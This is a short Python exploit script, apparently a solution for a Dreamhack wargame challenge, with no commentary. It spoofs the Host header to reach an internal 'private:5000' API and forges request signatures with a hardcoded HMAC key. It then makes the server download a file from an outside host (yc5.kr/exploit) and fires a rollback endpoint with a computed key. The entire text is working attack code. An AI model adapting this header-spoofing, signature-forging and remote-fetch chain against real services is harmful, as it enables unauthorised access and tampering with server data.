import requests
import hmac, hashlib

url = "http://host1.dreamhack.games:19363"
privateKey = b'let\'sbitcorinparty'
dbhash = "f2e6fa390c6bbc532d7bf6830c8397e3"

res = requests.get(url+"/apis/coin", headers={"Host":"private:5000", "Lang":"/integrityStatus"})
print(res.headers)

sigining = hmac.new( privateKey , b'src=http://yc5.kr/exploit', hashlib.sha512 )
sign = sigining.hexdigest()
res = requests.get(url+"/apis/coin", headers={"Host":"private:5000","Lang":"download?src=http://yc5.kr/exploit","Sign":sign})
print(res.headers)

sigining = hmac.new( privateKey , b'dbhash=exploit', hashlib.sha512 )
sign = sigining.hexdigest()
key = hashlib.sha512((dbhash).encode('ascii')).hexdigest()
res = requests.get(url+"/apis/coin", headers={"Host":"private:5000","Lang":"/rollback?dbhash=exploit","Sign":sign,"Key":key})
print(res.headers)
